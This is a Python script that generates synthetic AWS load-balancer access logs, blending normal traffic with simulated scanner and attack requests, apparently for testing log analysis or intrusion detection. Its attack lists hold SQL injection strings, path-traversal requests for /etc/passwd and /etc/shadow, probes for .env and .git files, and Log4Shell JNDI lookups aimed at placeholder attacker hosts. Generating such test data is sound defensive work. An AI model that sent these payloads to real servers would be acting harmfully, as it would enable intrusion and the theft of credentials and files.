import random
from datetime import datetime, timedelta
import ipaddress
import uuid

def generate_alb_logs(num_lines=10000, start_date=datetime(2024, 11, 1)):
    # Define fixed ALB names for better analysis
    alb_names = [
        "prod-web-alb",
        "prod-api-alb",
        "staging-alb"
    ]
    
    # Target groups associated with specific ALBs
    target_groups = {
        "prod-web-alb": [
            "arn:aws:elasticloadbalancing:us-east-1:123456789012:targetgroup/prod-web-front/73e2d6bc24d8",
            "arn:aws:elasticloadbalancing:us-east-1:123456789012:targetgroup/prod-web-back/92a1c4de56f7"
        ],
        "prod-api-alb": [
            "arn:aws:elasticloadbalancing:us-east-1:123456789012:targetgroup/prod-api-v1/81b3e7cf92a1",
            "arn:aws:elasticloadbalancing:us-east-1:123456789012:targetgroup/prod-api-v2/45d9f8g67h2"
        ],
        "staging-alb": [
            "arn:aws:elasticloadbalancing:us-east-1:123456789012:targetgroup/staging-web/34f5g6h789a",
            "arn:aws:elasticloadbalancing:us-east-1:123456789012:targetgroup/staging-api/12c3d4e567f"
        ]
    }

    # Normal URLs mapped to specific ALBs
    urls = {
        "prod-web-alb": [
            '/assets/main.css',
            '/images/logo.png',
            '/cart',
            '/checkout',
            '/products'
        ],
        "prod-api-alb": [
            '/api/v1/products',
            '/api/v1/orders',
            '/api/v2/users',
            '/api/health'
        ],
        "staging-alb": [
            '/api/v1/products',
            '/web/test',
            '/staging/health'
        ]
    }
    
    # Common legitimate user agents
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Python-urllib/3.8',
        'Apache-HttpClient/4.5.13 (Java/11.0.19)',
        'curl/7.64.1'
    ]

    # Scanner/malicious user agents
    scanner_agents = [
        'sqlmap/1.6.12 (http://sqlmap.org)',
        'Nuclei/2.9.1 (https://nuclei.projectdiscovery.io)',
        'Nmap Scripting Engine (https://nmap.org/book/nse.html)',
        'masscan/1.3.2',
        'nikto/2.1.6',
        'Acunetix-Agent',
        'dirbuster/1.0-RC1',
        'subfinder/v2.5.5',
        'gobuster/3.5',
        '',  # Empty user agent
        'python-requests/2.31.0',
        'Go-http-client/2.0',
        'WhatWeb/0.5.5',
        'zgrab/0.x',
        'Qualys SSL Assessment Scanner'
    ]

    # Attack patterns
    attack_patterns = [
        {
            'name': 'sql_injection',
            'urls': [
                '/login?id=1\'--',
                '/users?id=1 OR 1=1',
                '/search?q=1\' UNION SELECT',
                '/api/products?category=1\' OR \'1\'=\'1',
                '/admin/login?username=admin\'--&password=x'
            ],
            'methods': ['GET', 'POST'],
            'frequency': 0.2,
            'status_codes': [200, 403, 500]
        },
        {
            'name': 'path_traversal',
            'urls': [
                '/../../../etc/passwd',
                '/api/../../../config',
                '/static/../../secret',
                '/images/../../../../etc/shadow',
                '/assets/..%2f..%2f..%2fetc/passwd'
            ],
            'methods': ['GET'],
            'frequency': 0.15,
            'status_codes': [403, 404]
        },
        {
            'name': 'admin_scan',
            'urls': [
                '/.env',
                '/.git/config',
                '/wp-config.php.bak',
                '/config.php~',
                '/wp-admin',
                '/admin',
                '/administrator',
                '/phpmyadmin',
                '/adminer.php'
            ],
            'methods': ['GET', 'POST'],
            'frequency': 0.3,
            'status_codes': [301, 302, 401, 403]
        },
        {
            'name': 'vulnerability_probe',
            'urls': [
                '/actuator/env',
                '/metrics',
                '/server-status',
                '/debug/pprof',
                '/?x=${jndi:ldap://attack.com/exp}',
                '/test/${jndi:ldap://malicious.example.com/a}',
                '/path?class.module.classLoader.URLs%5B0%5D=0'
            ],
            'methods': ['GET', 'POST', 'PUT'],
            'frequency': 0.2,
            'status_codes': [404, 403, 500]
        }
    ]

    # IP ranges for attack simulation
    attacker_ip_ranges = [
        ('185.181.0.0', '185.181.255.255'),  # Known malicious range
        ('45.155.205.0', '45.155.205.255'),  # Tor exit nodes
        ('193.27.228.0', '193.27.228.255')   # VPN range
    ]

    # SSL/TLS configurations
    ssl_ciphers = [
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'TLS_AES_128_GCM_SHA256'
    ]
    tls_versions = ['TLSv1.2', 'TLSv1.3']

    def generate_attack_series():
        """Generate a series of related attack requests from the same IP"""
        pattern = random.choice(attack_patterns)
        attacker_range = random.choice(attacker_ip_ranges)
        attacker_ip = str(ipaddress.IPv4Address(random.randint(
            int(ipaddress.IPv4Address(attacker_range[0])),
            int(ipaddress.IPv4Address(attacker_range[1]))
        )))
        scanner_agent = random.choice(scanner_agents)
        
        series_length = random.randint(5, 15)
        return {
            'ip': attacker_ip,
            'agent': scanner_agent,
            'urls': random.choices(pattern['urls'], k=series_length),
            'method': random.choice(pattern['methods']),
            'status_codes': random.choices(pattern['status_codes'], k=series_length)
        }

    logs = []
    current_time = start_date
    active_attacks = []  # Track active attack series

    for _ in range(num_lines):
        # Select ALB and related configurations
        alb_name = random.choice(alb_names)
        is_scanner = random.random() < 0.1  # 10% of traffic is suspicious
        
        # Basic request details
        http_type = 'https' if alb_name.startswith('prod') else random.choice(['http', 'https'])
        timestamp = current_time.strftime('%Y-%m-%dT%H:%M:%S.%fZ')
        
        # Initialize request details
        request = ""
        status_code = 200
        user_agent = random.choice(user_agents)
        client_ip = str(ipaddress.IPv4Address(random.randint(0, 2**32 - 1)))
        
        if is_scanner and random.random() < 0.7:  # 70% of scanner traffic is part of a series
            # Start new attack series or continue existing one
            if not active_attacks or random.random() < 0.3:
                active_attacks.append(generate_attack_series())
            
            attack = random.choice(active_attacks)
            client_ip = attack['ip']
            user_agent = attack['agent']
            url = attack['urls'].pop(0)
            status_code = attack['status_codes'].pop(0)
            method = attack['method']
            request = f"{method} {url} HTTP/1.1"
            
            # Remove completed attack series
            if not attack['urls']:
                active_attacks.remove(attack)
        else:
            # Normal traffic
            url = random.choice(urls[alb_name])
            method = 'GET'
            status_code = random.choice([200, 200, 200, 200, 301, 302, 404])
            request = f"{method} {url} HTTP/1.1"

        # Client port
        client_port = random.randint(10000, 65000)
        
        # Target details
        if 'prod' in alb_name:
            target_ip = f"10.0.{random.randint(1,255)}.{random.randint(1,255)}"
        else:
            target_ip = str(ipaddress.IPv4Address(random.randint(0, 2**32 - 1)))
        target_port = 443 if alb_name.startswith('prod') else random.choice([80, 443, 8080])

        # Processing times
        time_multiplier = 1.0 if alb_name.startswith('prod') else 1.5
        request_processing = round(random.uniform(0, 0.1) * time_multiplier, 6)
        target_processing = round(random.uniform(0, 0.5) * time_multiplier, 6)
        response_processing = round(random.uniform(0, 0.1) * time_multiplier, 6)

        # Generate trace ID
        trace_id = f"Root=1-{hex(int(current_time.timestamp()))[2:]}-{uuid.uuid4().hex[:24]}"
        
        # Response size
        received_bytes = random.randint(0, 1000)
        sent_bytes = 0 if status_code == 304 else random.randint(200, 15000)

        # Domain names
        domain = f"{alb_name}.example.com" if not is_scanner else "-"
        
        # Target group
        target_group = random.choice(target_groups[alb_name])

        # Generate the log line
        log_line = (f"{http_type} {timestamp} {alb_name} {client_ip}:{client_port} {target_ip}:{target_port} "
                   f"{request_processing:.6f} {target_processing:.6f} {response_processing:.6f} {status_code} {status_code} "
                   f"{received_bytes} {sent_bytes} \"{request}\" \"{user_agent}\" {random.choice(ssl_ciphers)} "
                   f"{random.choice(tls_versions)} {target_group} \"{trace_id}\" \"{domain}\" \"-\" {random.randint(0,10)} "
                   f"{timestamp} \"forward\" \"-\" \"-\" \"{target_ip}:{target_port}\" \"{status_code}\" \"-\" \"-\"")
        
        logs.append(log_line)
        
        # Increment time with some randomness but ensure even distribution
        current_time += timedelta(seconds=random.uniform(0.1, 2))

    return logs

# Generate and write logs
if __name__ == "__main__":
    logs = generate_alb_logs()
    with open('alb-test.log', 'w') as f:
        for log in logs:
            f.write(log + '\n')